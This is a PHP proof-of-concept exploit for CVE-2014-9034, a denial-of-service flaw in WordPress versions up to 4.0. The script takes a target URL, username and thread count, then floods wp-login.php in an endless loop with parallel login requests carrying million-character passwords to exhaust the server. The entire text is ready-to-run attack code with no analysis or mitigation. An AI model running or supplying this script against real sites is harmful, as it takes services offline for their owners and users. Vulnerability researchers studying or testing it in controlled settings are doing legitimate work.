
echo "\nCVE-2014-9034 | WordPress <= v4.0 Denial of Service Vulnerability\n";
echo "Proof-of-Concept developed by john@secureli.com (http://secureli.com)\n\n";

echo "Sending POST data (username: " . $argv[2] . "; threads: " . $argv[3] . ") to " . $argv[1];

do {
 
$multi = curl_multi_init();
$channels = array();

for ($x = 0; $x < $argv[3]; $x++) {
  $ch = curl_init();

  $postData = array(
    &#039;log&#039; => $argv[2],
    &#039;pwd&#039; => str_repeat("A",1000000),
    &#039;redirect_to&#039; => $argv[1] . "/wp-admin/",
    &#039;reauth&#039; => 1,
    &#039;testcookie&#039; => &#039;1&#039;,
    &#039;wp-submit&#039; => "Log%20In");

  $cookieFiles = "cookie.txt";

  curl_setopt_array($ch, array(
      CURLOPT_HEADER => 1,
      CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
      CURLOPT_REFERER => $argv[1] . "/wp-admin/",
      CURLOPT_COOKIEJAR => $cookieFiles,
      CURLOPT_COOKIESESSION => true,
      CURLOPT_URL => $argv[1] . &#039;/wp-login.php&#039;,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => $postData,
      CURLOPT_FOLLOWLOCATION => true));
   
    curl_multi_add_handle($multi, $ch);
 
    $channels[$x] = $ch;
}
 
$active = null;

do {
  $mrc = curl_multi_exec($multi, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);
 
while ($active && $mrc == CURLM_OK) {
    do {

        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
}

foreach ($channels as $channel) {
    curl_multi_remove_handle($multi, $channel);
}
 
curl_multi_close($multi);
echo ".";
} while (1==1);

?>

